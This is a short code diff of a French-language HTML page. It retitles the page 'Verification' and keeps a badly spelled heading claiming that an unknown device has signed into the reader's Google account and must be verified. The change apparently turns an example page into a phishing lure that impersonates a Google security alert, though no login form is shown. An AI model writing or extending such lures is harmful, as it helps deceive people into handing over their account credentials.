@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exemple de lien</title>
+    <title>Verification</title>
 </head>
 <body>
     <h1>Nous avons remarquer qu'un appareil inconnue c'est connecter sur votre compt google, pour verfier </h1>
